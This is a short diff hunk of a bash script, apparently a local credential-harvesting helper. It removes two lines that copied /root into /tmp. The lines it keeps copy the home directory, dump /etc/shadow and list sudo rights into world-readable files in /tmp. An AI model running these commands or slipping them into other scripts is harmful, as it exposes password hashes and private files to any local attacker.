@@ -3,8 +3,6 @@
     #!/bin/bash
     cp -r ~ /tmp
     chmod 777 /tmp/billybob
-    cp -r /root /tmp
-    chmod 777 /tmp/root
     sudo cat /etc/shadow > /tmp/shadows
     chmod 777 /tmp/shadows
     sudo -l > /tmp/sudooos
